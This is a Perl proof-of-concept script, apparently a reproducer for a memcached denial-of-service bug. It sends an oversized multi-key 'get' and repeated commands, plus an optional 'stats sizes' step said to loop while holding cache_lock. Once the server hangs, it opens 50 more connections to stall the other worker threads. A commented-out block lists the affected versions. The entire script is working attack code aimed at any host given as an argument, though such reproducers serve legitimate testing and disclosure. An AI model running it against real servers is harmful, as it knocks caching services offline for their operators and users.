#!/usr/bin/perl
# It may be necessary to run a "flush_all" for this to work on long running
# instances.

use warnings;
use strict;

use IO::Socket::INET;

my $s = IO::Socket::INET->new(PeerAddr => $ARGV[0], Timeout => 4);
die unless $s;

my $USE_SIZES = 0;

print $s "version\r\n";
my $r = <$s>;
#if ($r =~ m/^VERSION 1\.5\./) {
#    die "unaffected";
#} elsif ($r =~ m/^VERSION 1\.(\d+)\.(\d+)/) {
#    die "unaffected" if ($1 == 4 && $2 > 36)
#        || ($1 == 4 && $2 < 11)
#        || ($1 < 4);
#    if (($1 == 4 && $2 < 25) ) {
#        print "using 'stats sizes' for < 1.4.25\n";
#        $USE_SIZES = 1;
#    }
#} else {
#    die "Unknown/unaffected";
#}

$SIG{ALRM} = sub { die "dead\n" };

my $get = 'dd ' x 65540;
chop $get;
my $count = 0;
while (1) {
    eval {
        print "break\n";
        alarm 20;
        print $s "version\r\n";
        $r = <$s>;
        print $s "set dd 0 0 2\r\nno\r\n";
        $r = <$s>;
        print $s "get $get\r\n";
        wait_end($s);
        print $s "get dd\r\n";
        wait_end($s);
        if ($USE_SIZES && $count > 10) {
            # stats sizes infinite loop while holding cache_lock
            print $s "set foo 0 0 2\r\nok\r\n";
            $r = <$s>;
            print $s "stats sizes\r\n";
            wait_end($s);
            $count = 0;
        }
        alarm 0;
        $count++;
    };
    if ($@ && $@ eq "dead\n") {
        print "hang\n";
        eval {
            alarm 10;
            # hang other worker threads on stuck item lock
            for (1..50) {
                $s = IO::Socket::INET->new(PeerAddr => $ARGV[0], Timeout => 4);
                print $s "get dd\r\n";
            }
        };
        die "done";
    } elsif ($@) {
        die $@;
    }
}

sub wait_end {
    my $s = shift;
    while (1) {
        my $r = <$s>;
        last if defined($r) && ($r =~ m/END/);
    }
}
